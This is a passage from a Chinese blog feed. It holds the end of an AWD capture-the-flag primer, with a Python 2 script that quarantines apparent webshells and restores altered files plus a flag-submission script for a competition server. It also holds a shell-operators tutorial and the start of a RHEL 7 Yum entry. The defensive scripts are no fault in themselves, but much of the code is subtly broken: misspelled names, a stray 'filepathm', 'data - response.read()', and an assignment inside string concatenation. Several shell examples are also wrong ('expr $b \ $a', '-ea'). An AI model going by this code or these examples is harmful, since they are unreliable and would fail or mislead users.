&apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;    webshellstring = &apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;    difffile = &apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;    Special_string = &apos;drops_log&apos;    #&#x514D;&#x6B7B;&#x91D1;&#x724C;    UNICODE_ENCODEING = &quot;utf-8&quot;    INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;    # &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x5178;    spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))    Special_path = {    &apos;bak&apos; : os.path.realpath(os.path.join(spec_base_path,bakstring)),    &apos;log&apos; : os.path.realpath(os.path.join(spec_base_path,logstring)),    &apos;webshell&apos; : os.path.realpath(os.path.join(spec_base_path,webshellstring)),    &apos;diffile&apos; : os.path.realpath(os.path.join(spec_base_path,diffile)),    }    def isListLike(value):        return isinstance(value, (list, tuple, set))    # &#x83B7;&#x53D6;Unicode&#x7F16;&#x7801;    def getUnicode(value, encoding=None, noneToNull=False):        if noneTuNull and value is None:            return noneTuNull        if isListLike(value):            value = list(getUnicode(_, encoding, noneToNull) for _ in value)            return value        if isinstance(value,unicode):            return value        elif isinstance(value, basestring):            while True:                try:                    return unicode(value, encoding or UNICODE_ENCODING)                except UnicodeDecodeError, ex:                    try:                        return unicode(value, UNICODE_ENCODING)                    except:                        value = value[:ex.start]+&quot;&quot;.join(INVALID_UNICODE_CAHR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]        else:            try:                return unicode(value)            except UnicodeDecodeError:                return unicode(str(value), errors=&quot;ignore&quot;)    # &#x76EE;&#x5F55;&#x521B;&#x5EFA;    def mkdir_p(path):        import errno        try:            os.makedirs(path)        except OSRrror as exc:            if exc.errno == errno.EEXIST and os.path.isdir(path):                pass            else: raise    # &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;    def getfilelist(cwd):        filelist = []        for root,subdirs, files in os.walk(cwd):            for filepath in files:                originalfile = os.path.join(root, filepath)                if Special_path_str not in originalfile:                    filelist.append(originalfile)        return filelist    # &#x8BA1;&#x7B97;&#x673A;&#x6587;&#x4EF6;MD5&#x503C;    def calcMD5(filepath):        try:            with open(filepath,&apos;rb&apos;) as f:                md5obj = hashlib.md5()                md5obj.update(f.read())                hash = md5obj.hexdigest()                return hash        except Exception, e:            print u&apos;[!] getmd5_error : &apos;+getUnicode(filepath)            print getUnicode(e)            try:                ORIGIN_FILE_LIST.remove(fielpath)                FILE_MD5_DICT.pop(filepath,None)            except KeyError, e:                pass    # &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;MD5    def getfilemd5dict(filelist = []):        filemd5dict = {}        for ori_file in filelist:            if Special_path_str not in ori_file:                md5 = calcMD5(os.path.realpath(ori_file))                if md5:                    filemd5dict[ori_file] = md5        return filemd5dict    # &#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;    def backup_file(filelist=[]):        # if len(os.listdir(Special_path[&apos;bak&apos;])) == 0;        for filepath in filelist:            if Special_path_str not in filepath:                shutil.copy2(filepathm Special_path[&apos;bak&apos;])    if __name__ == &apos;__main__&apos;:        print u&apos;-------------start---------------&apos;        for value in Special_path:            mkdir_p(Special_path[value])        # &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;MD5&#xFF0C;&#x540C;&#x4E8B;&#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;        ORIGIN_FILE_LIST = getfilelist(CWD)        FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)        backup_file(ORIGIN_FILE_LIST) # TODO &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x91CD;&#x540D;BUG        print u&apos;[*] pre work end!&apos;        while True:            file_lsit = getfilelist(CWD)            # &#x79FB;&#x9664;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;            diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST))            if len(diff_file_list) != 0:                # import pdb;pdb.set_trace()                for filepath in diff_file_list:                    try:                        f = open(filepath, &apos;r&apos;).read()                    except Exception, e:                        break                    if Special_string not in f:                        try:                            print u&apos;[*] websehll find :&apos; + getUnicode(filepath)                            shutil.move(filepath,os.path.join(Special_path[&apos;webshell&apos;],ntpath.basename(filepath) + &apos;.txt&apos;))                        except Exception as e:                            print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filepath)                        try:                            f = open(os.path.join(Special_path[&apos;log&apos;],&apos;log.txt&apos;),&apos;a&apos;)                            f.write(&apos;newfile: &apos; + getUnicode(filepath) = &apos; : &apos; + str(time.ctime()) + &apos;\n&apos;)                            f.close()                        except Exception as e:                            print u&apos;[-] log error : file move error: &apos; + getUnicode(e)    # &#x9632;&#x6B62;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FD8;&#x539F;&#x88AB;&#x4FEE;&#x6539;&#x6587;&#x4EF6;    md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)    for filekey in md5_dict:        if md5_dict[filekey] != FILE_MD5_DICT[filekey]:            try:                f = open(filekey, &apos;r&apos;).read()            except Exception, e:                break            if Special_string not in f:                try:                    print u&apos;[*] file had be change : &apos; + getUnicode(filekey)                    shutil.move(filekey, os.path.join(Special_path[&apos;difffile&apos;], ntpath.basename(filekey) + &apos;.txt&apos;))                    shutil.move(os.path.join(Special_path[&apos;bak&apos;], ntpath.basename(filekey)), filekey)                except Exception as e:                    print u&apos;[!] move webshell error, &quot;%&quot; maybe is webshell.&apos;%getUnicode(filekey)                try:                    f = open(os.path.join(Special_path[&apos;log&apos;],&apos;log.txt&apos;),&apos;a&apos;)                    f.write(&apos;diff_file: &apos; + getUnicode(filekey) + &apos; : &apos; + getUnicode(time.ctime()) + &apos;\n&apos;)                    f.close()                except Exception as e:                    print u&apos;[-] log error : done_diff: &apos; + getUnicode(filekey)                    pass    time.sleep(2)    #print `[*] &apos; + getUnicode(time.ctime())</code></pre><h1 id="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"><a href="#&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;" class="headerlink" title="&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;"></a>&#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;</h1><p>&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EA;&#x6709;&#x51E0;&#x5206;&#x949F;&#x4E00;&#x8F6E;&#xFF0C;&#x624B;&#x5DE5;&#x63D0;&#x4EA4;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;flag&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x51C6;&#x5907;&#x6279;&#x91CF;&#x63D0;&#x4EA4;flag&#x7684;&#x811A;&#x672C;&#xFF1A;</p><pre><code class="python">    #!/usr/bin/env python2    import sys    import json    import urllib    import httplib    server_host = &apos;10.10.0.2&apos;    server_port = 80    def submit(team_token, flag, host=server_host, port=server_port, timeout=5):        if not team_token or not flag:            raise Exception(&apos;team_token or flag not found&apos;)        conn = httplib.HTTPConnection(host, port, timeout=timeout)        params = urllib.urlencode({            &apos;token&apos;: team_token,            &apos;flag&apos;: flag,            })        headers = {            &quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot;        }        conn.request(&apos;POST&apos;, &apos;/api/submit_flag&apos;, params, headers)        response = conn.getresponse()        data - response.read()        return json.loads(data)    if __name__ == &apos;__main__&apos;:        if len(sys.argv) &lt; 3:            print &apos;usage: ./submitflag.py $team_token $flag&apos;            sys.exit()        host = server_host        if len(sys.argv) &gt; 3:            host = sys.argv[3]        print json.dumps(submit(sys.argv[1],sys.argv[2], host=host), indent=4)</code></pre><h1 id="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"><a href="#&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;" class="headerlink" title="&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;"></a>&#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;</h1><p>&#x901A;&#x8FC7;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;&#x7684;&#x5206;&#x6790;&#xFF1A;</p><ol><li>&#x611F;&#x77E5;&#x53EF;&#x80FD;&#x6B63;&#x5728;&#x53D1;&#x751F;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x4ECE;&#x800C;&#x89C4;&#x907F;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x98CE;&#x9669;</li><li>&#x5E94;&#x6025;&#x54CD;&#x5E94;&#xFF0C;&#x8FD8;&#x539F;&#x653B;&#x51FB;&#x8005;&#x7684;&#x653B;&#x51FB;&#x8DEF;&#x5F84;&#xFF0C;&#x4ECE;&#x800C;&#x633D;&#x56DE;&#x5DF2;&#x7ECF;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931;<br><img src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqNzjABB7ic3kJiboFAhfewO13JCH5icv85RLzia8xuzmUNia51oTj4XicRiabl7SW56y46PuuUggLUTeV6Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt=""><br><img src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIqNzjABB7ic3kJiboFAhfewO1d9FOHh2XciciaPbKQqZLcvFUOTTm5mDItUDicbBQcrPpGu9I3RQU8wtWw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt=""></li></ol><p><img src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt=""></p><h1 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h1><p><a href="https://github.com/admintony/Prepare-for-AWD.git" target="_blank" rel="noopener">&#x811A;&#x672C;&#x6E90;&#x7801;&#x94FE;&#x63A5;</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。&lt;br&gt;新手该知道的一些知识以及技巧，下面简单整理一下&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="https://marnm.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="https://marnm.github.io/tags/CTF/"/>
    
      <category term="信息安全" scheme="https://marnm.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络空间安全" scheme="https://marnm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Shell的基本运算符</title>
    <link href="https://marnm.github.io//posts/1fdc29d2/"/>
    <id>https://marnm.github.io//posts/1fdc29d2/</id>
    <published>2018-08-10T14:18:16.000Z</published>
    <updated>2018-08-12T08:28:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>Shell &#x548C;&#x5176;&#x5B83;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5305;&#x62EC;&#xFF1A;</p><ul><li>&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;</li><li>&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;<br>&#x539F;&#x751F;bash&#x4E0D;&#x652F;&#x6301;&#x7B80;&#x5355;&#x7684;&#x6570;&#x5B66;&#x8FD0;&#x7B97;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5176;&#x5B83;&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x4F8B;&#x5982;<code>awk</code>&#x548C;<code>expr</code>&#x6700;&#x5E38;&#x7528;&#x3002;<br><code>expr</code>&#x662F;&#x4E00;&#x6B3E;&#x8868;&#x8FBE;&#x5F0F;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4F7F;&#x7528;&#x5B83;&#x80FD;&#x5B8C;&#x6210;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x6C42;&#x503C;&#x64CD;&#x4F5C;&#x3002;<a id="more"></a><h1 id="&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;</h1>&#x76F8;&#x5F53;&#x4E8E;&#x5C0F;&#x5B66;&#x77E5;&#x8BC6;</li></ul><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>+</td><td>&#x52A0;</td><td>`expr $a + $b`&#x7ED3;&#x679C;&#x4E3A;30</td></tr><tr><td>-</td><td>&#x51CF;</td><td>`expr $b - $a`&#x7ED3;&#x679C;&#x4E3A;10</td></tr><tr><td>*</td><td>&#x4E58;</td><td>`expr $a \* $b`&#x7ED3;&#x679C;&#x4E3A;200</td></tr><tr><td>/</td><td>&#x9664;</td><td>`expr $b \ $a`&#x7ED3;&#x679C;&#x4E3A;2</td></tr><tr><td>%</td><td>&#x53D6;&#x4F59;</td><td>`expr $a % $3`&#x7ED3;&#x679C;&#x4E3A;1</td></tr><tr><td>=</td><td>&#x8D4B;&#x503C;</td><td>`expr $a = $b`&#x7ED3;&#x679C;&#x4E3A;false</td></tr><tr><td>==</td><td>&#x7B49;&#x4E8E;</td><td>`expr $a == $b`&#x7ED3;&#x679C;&#x4E3A;false</td></tr><tr><td>!=</td><td>&#x4E0D;&#x7B49;&#x4E8E;</td><td>`expr $a != $b`&#x7ED3;&#x679C;&#x4E3A;true</td></tr></tbody></table><h1 id="&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;</h1><p>&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;&#x53EA;&#x652F;&#x6301;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x9664;&#x975E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x503C;&#x662F;&#x6570;&#x5B57;&#x3002;</p><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>-eq</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;<code>&#x76F8;&#x7B49;</code>&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[ $a -ea $b]&#x8FD4;&#x56DE;false</td></tr><tr><td>-ne</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;<code>&#x4E0D;&#x76F8;&#x7B49;</code>,&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[ $a -ne $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-gt</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5927;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -gt $b ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-lt</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5C0F;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -lt $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-ge</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5927;&#x4E8E;&#x7B49;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -ge $b ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-le</td><td>&#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;<code>&#x5C0F;&#x4E8E;&#x7B49;&#x4E8E;</code>&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -le $b ]&#x8FD4;&#x56DE;true</td></tr></tbody></table><h1 id="&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26;</h1><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>!</td><td>&#x2018;&#x975E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x628A;&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;&#x4E2D;&#x7684;&#x5224;&#x65AD;&#x7ED3;&#x679C;&#x53D6;&#x76F8;&#x53CD;&#x503C;</td><td>[ !false ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-o</td><td>&#x2018;&#x6216;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x6709;&#x4E00;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x4E3A;true&#x5219;&#x8FD4;&#x56DE;true</td><td>[ $a -lt 20 -o $b -gt 100]&#x8FD4;&#x56DE;true</td></tr><tr><td>-a</td><td>&#x2018;&#x4E0E;&#x2019;&#x8FD0;&#x7B97;&#xFF0C;&#x4E24;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x90FD;&#x4E3A;true&#x624D;&#x8FD4;&#x56DE;true</td><td>[ $a -lt -a $b -gt 100 ]&#x8FD4;&#x56DE;false</td></tr></tbody></table><h1 id="&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#x7B26;</h1><pre><code>    &amp;&amp;&#xFF0C;&#x903B;&#x8F91;`&#x4E0E;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x6210;&#x529F;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 &amp;&amp; $b -gt 100]]&#x8FD4;&#x56DE;false    ||&#xFF0C;&#x903B;&#x8F91;`&#x6216;`&#x8FD0;&#x7B97;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x6761;&#x4EF6;&#x6267;&#x884C;&#x5931;&#x8D25;&#x540E;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#xFF0C;[[ $a -lt 100 `||` $b -gt 100]]&#x8FD4;&#x56DE;true</code></pre><h1 id="&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26;</h1><!--more--><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>=</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[$a = $b]&#x8FD4;&#x56DE;false</td></tr><tr><td>!=</td><td>&#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true</td><td>[$a != $b ]&#x8FD4;&#x56DE;true</td></tr><tr><td>-z</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E3A;0&#x8FD4;&#x56DE;true</td><td>[ -z $a ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-n</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x662F;&#x5426;&#x4E3A;0&#xFF0C;&#x4E0D;&#x4E3A;0&#x8FD4;&#x56DE;true</td><td>[ -n &#x201C;$a&#x201D; ]&#x8FD4;&#x56DE;true</td></tr><tr><td>str</td><td>&#x68C0;&#x6D4B;&#x5B57;&#x7B26;&#x4E32;&#x662F;&#x5426;&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4E3A;&#x7A7A;&#x8FD4;&#x56DE;true</td><td>[ $a ]&#x8FD4;&#x56DE;true</td></tr></tbody></table><h1 id="&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;"><a href="#&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;" class="headerlink" title="&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;"></a>&#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;</h1><table><thead><tr><th>&#x8FD0;&#x7B97;&#x7B26;</th><th>&#x8BF4;&#x660E;</th><th>&#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7;</th></tr></thead><tbody><tr><td>-b</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5757;&#x8BBE;&#x5907;&#x6587;&#x4EF6;</td><td>[ -b $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-c</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x6587;&#x4EF6;</td><td>[ -c $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-d</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x76EE;&#x5F55;&#x7C7B;&#x578B;</td><td>[ -d $file ]&#x8FD4;&#x56DE;false</td></tr><tr><td>-f</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x666E;&#x901A;&#x6587;&#x4EF6;&#xFF08;&#x65E2;&#x4E0D;&#x662F;&#x76EE;&#x5F55;&#xFF0C;&#x4E5F;&#x4E0D;&#x662F;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#xFF09;</td><td>[ -f $file]</td></tr><tr><td>-g</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SGID&#x4F4D;</td><td></td></tr><tr><td>-k</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;&#x7C98;&#x7740;&#x4F4D;(Sticky Bit)</td><td></td></tr><tr><td>-p</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x6709;&#x540D;&#x7BA1;&#x9053;</td><td></td></tr><tr><td>-u</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x8BBE;&#x7F6E;&#x4E86;SUID&#x4F4D;</td><td></td></tr><tr><td>-r</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x8BFB;</td><td></td></tr><tr><td>-w</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x5199;</td><td></td></tr><tr><td>-x</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x6267;&#x884C;</td><td></td></tr><tr><td>-s</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x4E3A;&#x7A7A;</td><td></td></tr><tr><td>-e</td><td>&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#xFF08;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF09;&#x662F;&#x5426;&#x5B58;&#x5728;</td><td></td></tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Shell 和其它编程语言一样，支持多种运算符，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;算数运算符&lt;/li&gt;
&lt;li&gt;关系运算符&lt;/li&gt;
&lt;li&gt;布尔运算符&lt;/li&gt;
&lt;li&gt;字符串运算符&lt;/li&gt;
&lt;li&gt;文件测试运算符&lt;br&gt;原生bash不支持简单的数学运算，但是可以通过其它命令来实现，例如&lt;code&gt;awk&lt;/code&gt;和&lt;code&gt;expr&lt;/code&gt;最常用。&lt;br&gt;&lt;code&gt;expr&lt;/code&gt;是一款表达式计算工具，使用它能完成表达式的求值操作。
    
    </summary>
    
      <category term="Linux" scheme="https://marnm.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
      <category term="Shell" scheme="https://marnm.github.io/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>RHEL 7配置Yum软件仓库</title>
    <link href="https://marnm.github.io//posts/afdfa673/"/>
    <id>https://marnm.github.io//posts/afdfa673/</id>
    <published>2018-08-07T07:18:07.000Z</published>
    <updated>2022-05-26T13:44:31.195Z</updated>
    
